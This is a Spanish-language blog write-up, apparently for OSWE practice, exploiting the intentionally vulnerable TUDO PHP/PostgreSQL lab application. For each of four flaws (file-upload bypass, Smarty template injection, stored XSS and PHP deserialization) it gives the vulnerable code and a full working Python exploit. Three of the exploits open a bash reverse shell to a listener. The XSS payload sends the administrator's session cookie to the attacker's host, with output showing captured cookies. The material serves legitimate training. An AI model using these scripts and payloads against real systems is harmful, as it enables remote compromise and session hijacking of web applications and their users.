---
layout: post
title: tudo - docker
description: tudo - docker
tags: [serializacion,xss,sqli,oswe]
---

Continuando con mi preparación hacia OSWE, encontré un proyecto construido en `Docker` que presenta vulnerabilidades clásicas en aplicaciones web. **TUDO** es la aplicación vulnerable escrita en `php` y como gestor de datos utiliza `postgresql`,se encuentra alojado en el siguiente [repositorio](https://github.com/bmdyy/tudo). 

La aplicación esta pensada como una prueba de penetración de **caja blanca** así que sientase libre de leer y comprender el código.

La forma en que lo he redactado es explicando un poco el código vulnerable, su explotación manual y finalmente un script que automatize la intrusión por cada vulnerabilidad encontrada.

Credenciales predeterminada:

- admin : admin
- user1 : user1
- user2 : user2

> La IP asignada al correr el contenedor será 172.17.0.2

----

## Subida de archivos

### Código vulnerable

Dentro del direcotrio `admin` detectaremos el archivo `upload_image.php` el cual gestiona la forma en que un archivo tipo imagen se esté subiendo al servidor (prviamente logueado como usuario `admin`).  
A continuación se mostrará pequeños fragmentos de código con el cual se llega explotar esta vulnerabilidad:

La imágen devolverá un booleano `true` si es subido mediante el método `POST` para que valide las instrucciones siguientes

```
[...]
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($_FILES['image']) {
        $validfile = true;
[...]
```

El siguiente fragmento de código determinará el tipo de fichero que se esta subiendo con su respectivo tamaño.

```
[...]
$is_check = getimagesize($_FILES['image']['tmp_name']);
if ($is_check === false) {
    $validfile = false;
    echo 'Failed getimagesize<br>';
}
[...]
```

El servidor realizará una comprobación evadir archivos que pesenten las siguientes extenciones.

```
[...]
$illegal_ext = Array("php","pht","phtm","phtml","phpt","pgif","phps","php2","php3","php4","php5","php6","php7","php16","inc");
[...]
```

Posteriormente hará otra validación a través de los `MIME Types`, esto comprobará por el lado del servidor que realmente se esté subiendo un archivo imágen.

> MIME Types: Es la manera estandard de mandar contenido a través de la red. Especificamente son la llave que identifica a cada archivo con su tipo de contenido

```
[...]
$allowed_mime = Array("image/gif","image/png","image/jpeg");
$file_mime = $_FILES['image']['type'];
if (!in_array($file_mime, $allowed_mime)) {
    $validfile = false;
    echo 'Illegal mime type<br>';
}
[...]
```

La imágen se guerdará, y posteriormente podremos visualizar la imágen por el servicio web.

----

### Explotación manual

Sabiendo que extensiones NO son válidas, me puse a investidar como bypasear esa blacklist.  
Busco en google por palabras claves como el siguiente: `bypass file upload images` o `hacktrix file upload`

La web de HackTrix presenta una lista de extensiones con las que podría probar.

![bypass](/assets/imgs/tudo/bypass.png)

El archivo de prueba de nombre `test.phar` que enviaré tiene el siguiente contenido.

**GIF89** es un número mágico que engañará al momento de realizar las comprobaciones en la parte del encabezado

> **Firma de archivos**:utilizados para identificar o verificar el contenido de un archivo. Estas firmas también se conocen como números mágicos o Bytes mágicos. ([https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures))

```
GIF89a;
<?php
    echo "test123";
?>
```

Me dirijo a la ruta de carga de archivos.

![file](/assets/imgs/tudo/file.png)

La solicitud intercepto con `BurpSuite` para modificar el aparatado de `Content-Type`, de esta forma consigo evadir las restricciones en la subida de archivos.

![image](/assets/imgs/tudo/image.png)

Desde el navegador se visualiza el archivo subido y como la aplicación web interpreta el código del script 

![test](/assets/imgs/test.png)

![gif](/assets/imgs/gif.png)

----

### Automatizando la vulnerabilidad

```
#!/usr/bin/python3

import requests, sys, subprocess, time

if len(sys.argv) != 4:
	print("usage: %s TARGET HOST ADMIN_PHPSESSID" % sys.argv[0])
	sys.exit(-1)

target = sys.argv[1]
host   = sys.argv[2]
sessid = sys.argv[3]

lport = 4444
payload = "GIF89a;<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'\");?>" % (host,lport)
burp = {"http":"http://127.0.0.1:8080"}

def upload_image():
	f = {
		'image':('shell.phar',payload,'image/gif'),
		'title':("shell")
	}
	c = {"PHPSESSID":sessid}
	r = requests.post("http://%s/admin/upload_image.php" % target, cookies=c, files=f, allow_redirects=False, proxies=burp)
	return "Success" in r.text

if upload_image():
	print("[+] Archivo subido exitosamente")
else:
	print("[-] Error")
	sys.exit(-1)

print("[*] Iniciando shell inversa...\n")

subprocess.Popen(["nc","-nvlp","%d"%lport])
time.sleep(1)
requests.get("http://%s/images/shell.phar" % target, proxies=burp)
```

Ejecución del script configurado para que sea interceptado con `BurpSuite` y ver a detalle como viajan las peticiones hasta tener una shell como usuario `www-data`

```
❯ python3 image_upload.py 172.17.0.2 192.168.0.107 5hb7f1ap9drv0c8nb5apntq2ef
[+] Archivo subido exitosamente
[*] Iniciando shell inversa...

listening on [any] 4444 ...
connect to [192.168.0.107] from (UNKNOWN) [172.17.0.2] 44602
bash: cannot set terminal process group (130): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ef90800ff270:/var/www/html/images$ hostname -I
hostname -I
172.17.0.2 
```

----

## Ejecución Remota de Comandos

### Código vulnerable

Entonces haremos un análisis del archivo `./admin/update_motd.php` que es aquí donde encontraremos la segunda vulnerabilidad.

La condicional verifica que se esté tramitando data por el método `POST` con un parámetro `message` que es éste el parte vulnerable que nos permitirá obtener una shell.

```
[...]
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $message = $_POST['message'];
[...]
```

Si la variable `$message` tiene contenido se abrirá el fichero `motd.tpl` en modo de escritura guardando de esta forma el mensaje tramitado via `POST`, y termina cerrando el fichero.

```
[...]
if ($message !== "") {
    $t_file = fopen("../templates/motd.tpl","w");
    fwrite($t_file, $message);
    fclose($t_file);
[...]
```

El contenido que se ha guardado el fichero se visualizará para todos los usuarios que hayan iniciado sesión. Deduzco esto porque al analizar el fichero `./index.php` encuentro el siguiente código.

```
[...]
echo $smarty->fetch("motd.tpl").'<br>';
[...]
```

Sabiendo esto introduzco código php en el apartado vulnerable pero no es capaz de interpretarlo.  
Analizando nuevamente el código fuente de la aplicación me doy cuenta que está haciendo uso del motor de plantilla `smarty`.

> ***Smarty*: es un motor de plantillas para PHP, que facilita la separación de la presentación (HTML/CSS) de la lógica de la aplicación.  
> Más información: [https://smarty-php.github.io](https://smarty-php.github.io)

Dentro de su codigo fuente de `GitHub` de `smarty` en el fichero `./vendor/smarty/smarty/RELEASE_NOTES` encuentro lo siguiente:

![php](/assets/imgs/tudo/php.png)

Por tanto `{php}{/php}` son etiquetas para incrustar `php` en las plantillas.

----

### Explotación vulnerable

Logueado como usuario `admin` se visualiza el mensaje por defecto que viene en panel principal de usuario.

![admin](/assets/imgs/tudo/admin.png)

Desde el lado de usuario `user1` se mostraria de manera similar variando solo el nombre de usuario

![user1](/assets/imgs/tudo/user1.png)

Me dirijo a la siguiente `http://172.17.0.2/admin/update_motd.php`  para actualizar el mensaje.

> Recordad que al ser pentesting en caja blanca ya conozco todas las rutas que tiene esta aplicación por ello paso por alto la parte de hacer fuzzing de directorios en la web.

![update](/assets/imgs/tudo/update.png)

Introduzco codigo en etiquetas `php` para hacer una traza de que verdaderamente esta funcionando.

![test123](/assets/imgs/tudo/test123.png)

Vuelvo al panel principal y efectivamente tengo la capacidad de inyectar código de forma remota

![whoami](/assets/imgs/tudo/whoami.png)

----

### Automatizando la vulnerabilidad

```
#!/usr/bin/python3

import requests, sys, subprocess, time

if len(sys.argv) != 4:
	print("usage: %s TARGET HOST ADMIN_PHPSESSID"%sys.argv[0])
	sys.exit(-1)

target    = sys.argv[1]
host      = sys.argv[2]
phpsessid = sys.argv[3]
burp = {"http" : "http://127.0.0.1:8080"}

lport = 4444

def set_motd(msg):
	cookie = {"PHPSESSID" : phpsessid}
	data = {"message" : msg}
	r = requests.post("http://%s/admin/update_motd.php" % target, data=data,cookies=cookie)
	return "Message set!" in r.text

def get_homepage():
	cookie = {"PHPSESSID" : phpsessid}
	r = requests.get("http://%s/" % target, cookies=cookie)

if set_motd("{php}exec(\"/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'\");{/php}" % (host,lport)):
	print("[+] MoTD cambiando\n")
else:
	print("[-] Fallo al configurar MoTD")
	sys.exit(-1)

print("[*] Iniciando NetCat...")
subprocess.Popen(["nc","-nvlp","%d" % lport])
time.sleep(1)
get_homepage()
```

Obteniendo una shell somo usuario `www-data`

```
❯ python3 set_motd.py 172.17.0.2 192.168.0.107 6bfifbv9t3b3gbtlvaojoa72jf
[+] MoTD cambiando

[*] Iniciando NetCat...
listening on [any] 4444 ...
connect to [192.168.0.107] from (UNKNOWN) [172.17.0.2] 48378
bash: cannot set terminal process group (130): Inappropriate ioctl for device
bash: no job control in this shell
www-data@c5b5a4eed888:/var/www/html$ whoami
whoami
www-data
```

----

## XSS

### Código vulnerable

Dentro del fichero `./profile.php` encontramos una condicional que evalua una consulta por el método `POST` donde en la variable `$description` guardará el contenido que introduzcamos. Se conectará a la base de datos de esta forma actualizará el campo `description` en la tabla `users`.  

```
[...]
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!isset($_POST['description'])) {
        $error = true;
    }
    else {
        $description = $_POST['description'];
        
        include('includes/db_connect.php');
        $ret = pg_prepare($db, "updatedescription_query", "update users set description = $1 where username = $2");
        $ret = pg_execute($db, "updatedescription_query", Array($description, $_SESSION['username']));
        $success = true;
    }
}
[...]
```

No se hace ninguna desinfección del dato tramitado por tanto podemos enviar código HTML. Podremos visualizar la interpretación del código dentro de la página de inicio del administrador

Aquí se muestra que siendo usuario `admin` nos mostrará en la columna 4 los registros de la columna `description`

```
[...]
echo '<h4>[Admin Section]</h4>';
echo '<table>';
echo '<tr><th>Uid</th><th>Username</th><th>Password (SHA256)</th><th>Description</th></tr>';
while ($row = pg_fetch_row($ret)) {
    echo '<tr>';
    echo '<td>'.$row[0].'</td>';
    echo '<td>'.$row[1].'</td>';
    echo '<td>'.$row[2].'</td>';
    echo '<td>'.$row[3].'</td>';
    echo '</tr>';
}
echo '</table><br>';
[...]
```

----

### Explotación manual

Inyectando código `html` en el campo description.

![desc](/assets/imgs/tudo/desc.png)

Visualizando desde el panel principal

![panel](/assets/imgs/tudo/panel.png)

Podemos obtener la cookie de usuario `admin` de forma silenciosa con el siguiente codigo:


```
<script>document.write('<img src="http://192.168.0.107:8000/test.jpg?cookie='+document.cookie+'">')</script>
```
> Dentro del código fuente de la aplicación hay emulador de administrador que se ejecuta cada minuto 
> `*/1 * * * * /app/emulate_admin.py`

Pongo en escucha un servicio web con `Python` y obtengo la cookie de sesión.

```
❯ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
172.17.0.2 - - [09/Dec/2021 17:11:07] code 404, message File not found
172.17.0.2 - - [09/Dec/2021 17:11:07] "GET /test.jpg?cookie=PHPSESSID=arnt5eeru0be2atru6th5vt4gf HTTP/1.1" 404 -
```

----

### Automatizando la vulnerabilidad

```
#!/usr/bin/python3

import requests, sys, subprocess, socket

if len(sys.argv) != 5:
	print('usage: %s TargetIp AttackIp Username Password'%sys.argv[0])
	sys.exit(-1)

target = sys.argv[1]
host   = sys.argv[2]
user   = sys.argv[3]
passwd = sys.argv[4]

lport  = 4444
s = requests.Session()

def login():
	data = {'username' : user,
		'password' : passwd
		}
	r = s.post("http://%s/login.php" % target, data=data)
	return "[MoTD]" in r.text

def set_desc(d):
	data = {"description":d}
	r = s.post("http://%s/profile.php" % target, data=data)
	return "Success" in r.text

if login():
	print("[+] Logged in!")
else:
	print("[-] Failed to log in.")
	sys.exit(-1)

if set_desc("<script>document.write('<img src=http://%s:%d/'+document.cookie+' />');</script>" % (host,lport)):
	print("[+] Cambiando descripcion")
else:
	print("[-] Error al cambiar descripcion.")
	sys.exit(-1)

print("[*] Servicio web en el puerto %d..."%lport)
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host,lport))
s.listen()

print("[*] Esperando que el administrador se active ...")
(sock_c, ip_c) = s.accept()
get_request = sock_c.recv(4096)
admin_cookie = get_request.split(b" HTTP")[0][5:].decode("UTF-8")

print("[+] Cookie de administrador:")
print("[+] " + admin_cookie)
```

Ejecución del script

```
❯ python3 steal_cookie.py 172.17.0.2 192.168.0.107 admin admin
[+] Logged in!
[+] Cambiando descripcion
[*] Servicio web en el puerto 4444...
[*] Esperando que el administrador se active ...
[+] Cookie de administrador:
[+]PHPSESSID=a7g92b0i44ubv6mvvbetguhf37
```

----

## Deserialización de PHP

> La **serialización** es el proceso de convertir un objeto en un formato de datos que se puede restaurar más tarde.
> Hoy en día, el formato de datos más popular para serializar datos es JSON, antes de eso era XML

### Código vulnerable

El fichero `./admin/import_user.php` incluye `../includes/utils.php` el cual contiene el método `\_\_destruct` que es un método mágico utilizado con la deserialización

> `__destruct`: se llama cuando el script PHP finaliza y el objeto se destruye

Se envia una petición `POST` un objeto serializado en `PHP` guardando en la variable `$userObj`

```
[...]
include('../includes/utils.php');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $userObj = $_POST['userobj'];
    if ($userObj !== "") {
        $user = unserialize($userObj);
        include('../includes/db_connect.php');
[...]
```

El método `__destruct` llama a la función `file_put_contents` y que se encarga de escribir datos en un fichero por lo que podemos usar esto para escribir código ejecutable en la raíz web y luego ejecutarlo.

```
[...]
public function __destruct() {
    file_put_contents($this->f, $this->m, FILE_APPEND);
}
[...]
```

----

### Explotación manual

Para explotar esta vulnerabilidad he creado un simple script php que serializa los datos de la clase `Log` de la siguiente forma:

```
<?php
    class Log {
        public function __construct($f, $m) {
            $this->f = $f;
            $this->m = $m;
        }
    }
    $obj = new Log($argv[1],$argv[2]);
    echo serialize($obj);  
?>
```

Lo que va hacer es pedir 2 argumentos el primero la ruta donde se guardará el archivo a crear y la segunda el contenido que va a tener.

```
❯ php test.php /var/www/html/test.php "<?php phpinfo(); ?>"
O:3:"Log":2:{s:1:"f";s:22:"/var/www/html/test.php";s:1:"m";s:19:"<?php phpinfo(); ?>";}
```

Con el objeto serializado que se ha construido emito una petición por `POST` haciendo uso de la utilidad `curl`.

```
❯ curl -X POST http://172.17.0.2/admin/import_user.php --data-urlencode 'userobj=O:3:"Log":2:{s:1:"f";s:22:"/var/www/html/test.php";s:1:"m";s:18:"<?php phpinfo();?>";}' -H "Cookie: PHPSESSID=ub6kqofpe9a7j01t9s48t9f7nk"
```

Ya desde el navegador es posible ver como el archivo creado es accesible.

![serial](/assets/imgs/tudo/serial.png)

----

### Automatizando la vulnerabilidad

Script `test.php` para serializar objeto php.

```
<?php
    class Log {
        public function __construct($f, $m) {
            $this->f = $f;
            $this->m = $m;
        }
    }
    $obj = new Log($argv[1],base64_decode($argv[2]));
    echo serialize($obj);

?>
```

Script que automatiza la intrusión

```
#!/usr/bin/python3

import requests, sys, subprocess, base64, time

if len(sys.argv) != 4:
	print("usage: %s TARGET HOST ADMIN_PHPSESSID" % sys.argv[0])
	sys.exit(-1)

target = sys.argv[1]
host   = sys.argv[2]
sessid = sys.argv[3]
burp = {"http":"http://127.0.0.1:8080"}

lport = 4444

f = "/var/www/html/shell.php"
c = "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'\"); ?>" % (host,lport)
c = base64.urlsafe_b64encode(c.encode("UTF-8")).decode("UTF-8")

proc = subprocess.Popen("php test.php '%s' '%s'"%(f,c),shell=True,stdout=subprocess.PIPE)
payload = proc.stdout.read()
print("[+] Generar payload")

def import_user():
	cookie = {"PHPSESSID":sessid}
	data = {"userobj":payload}
	r = requests.post("http://%s/admin/import_user.php" % target, data=data, cookies=cookie)

import_user()
print("[*] Solicitud enviada")

print("[*] Iniciando escucha...\n")
subprocess.Popen(["nc","-nvlp","%d"%lport])
time.sleep(1)

requests.get("http://%s/shell.php" % target)

while True:
	pass
```

Obteniendo shell como usuario `www-data`.

```
❯ python3 deserialize.py 172.17.0.2 192.168.0.107 mh94o35k7tqtp8bre3fopmi2i1
[+] Generar payload
[*] Solicitud enviada
[*] Iniciando escucha...

listening on [any] 4444 ...
connect to [192.168.0.107] from (UNKNOWN) [172.17.0.2] 38698
bash: cannot set terminal process group (130): Inappropriate ioctl for device
bash: no job control in this shell
www-data@0e91e4d48c9e:/var/www/html$ whoami
whoami
www-data
```

Hay 2 vulnerabilidades más, uno `SQL blind` en postgresql y otro es un `token spray` del usuario `admin` pero yo lo dejaré hasta aquí, los animo a continuar con esas dos restantes que su análisis es un poco más complicada que las anteriores, aunque talvés más adelante me animo a terminarla pero por hoy fue suficiente.

